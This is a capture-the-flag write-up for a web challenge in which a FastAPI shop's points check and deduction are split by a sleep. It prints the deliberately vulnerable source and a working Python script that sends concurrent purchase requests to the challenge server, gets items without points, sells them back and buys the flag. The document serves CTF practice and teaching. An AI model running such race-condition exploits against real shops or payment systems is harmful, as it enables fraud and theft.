# Flashsale

category: web

requires: race condition

we are given `main.py`:

```py
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import List
import asyncio
import uuid

app = FastAPI()

user_db = {}

shop = {"CTF Flag": 10, "White Flag": 1}
flag = open("flag.txt").read().strip()


class User(BaseModel):
    points: int = 1
    items: List[int] = []


class ItemRequest(BaseModel):
    uid: str
    item: str


@app.get("/new")
async def new():
    while True:
        new_id = uuid.uuid4()
        if str(new_id) not in user_db.keys():
            user_db[str(new_id)] = User()
            return {"uid": new_id}


@app.get("/")
@app.get("/shop")
async def list_shop_items():
    return shop


@app.post("/shop")
async def purchase_item(request: ItemRequest):
    try:
        user = user_db[request.uid]
    except KeyError:
        raise HTTPException(status_code=400, detail="Invalid User")

    try:
        price = shop[request.item]
    except KeyError:
        raise HTTPException(status_code=400, detail="Invalid Item")

    if user.points < price:
        raise HTTPException(status_code=400, detail="Insufficient Points")

    await asyncio.sleep(0.1)
    user.items.append(request.item)
    if user.points > 0:
        user.points -= price

    if request.item == "CTF Flag":
        return {"msg": flag}

    return {"msg": f"You bought a {request.item}"}


@app.post("/sell")
async def sell_item(request: ItemRequest):
    try:
        user = user_db[request.uid]
    except KeyError:
        raise HTTPException(status_code=400, detail="Invalid User")

    if request.item not in user.items:
        raise HTTPException(
            status_code=400, detail=f"No {request.item} to sell"
        )

    try:
        price = shop[request.item]
    except KeyError:
        raise HTTPException(status_code=400, detail="We don't buy such items")

    user.items.remove(request.item)
    user.points += price

    return {"msg": f"You sold a {request.item}"}
```

so this is just a shop we can post requests to, to buy and sell stuff. cool.

but when user gets initialized we only get 1 point, and we need 10 points to buy a flag :( ...

so we begin looking around for the sussy in the code and theres just a random `await asyncio.sleep(0.1)`, when buying something it checks sufficient points -> waits 0.1s -> adds it

so we can abuse race condition by just buying 10 white flags within 0.1s because it doedsnt have time to realise we have no money

also, because of `if user.points > 0: user.points -= price` we dont actually go into negative balance

so, we can just buy 10 white flags simultaneously with 1 point and then sell them all, then buy a flag. soo here

```py
import requests
import concurrent.futures

uid = requests.get("http://chals.f.cyberthon23.ctf.sg:44050/new").json()["uid"]

#buy 10 white flags

def f():
    url = "http://chals.f.cyberthon23.ctf.sg:44050/shop"
    data = {"uid": uid, "item": "White Flag"}

    response = requests.post(url, json=data)

    return response.json()

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(f) for _ in range(20)]
    results = [future.result() for future in concurrent.futures.as_completed(futures)]

#sell all

url = "http://chals.f.cyberthon23.ctf.sg:44050/sell"
data = {"uid": uid, "item": "White Flag"}

for i in range(10):
    response = requests.post(url, json=data)

#rebuy 1

url = "http://chals.f.cyberthon23.ctf.sg:44050/shop"
data = {"uid": uid, "item": "CTF Flag"}

response = requests.post(url, json=data)

print(response.json())


```

ok this code is damn messy bc i was too lazy to be nice with the urls and stuff but its too late to fix that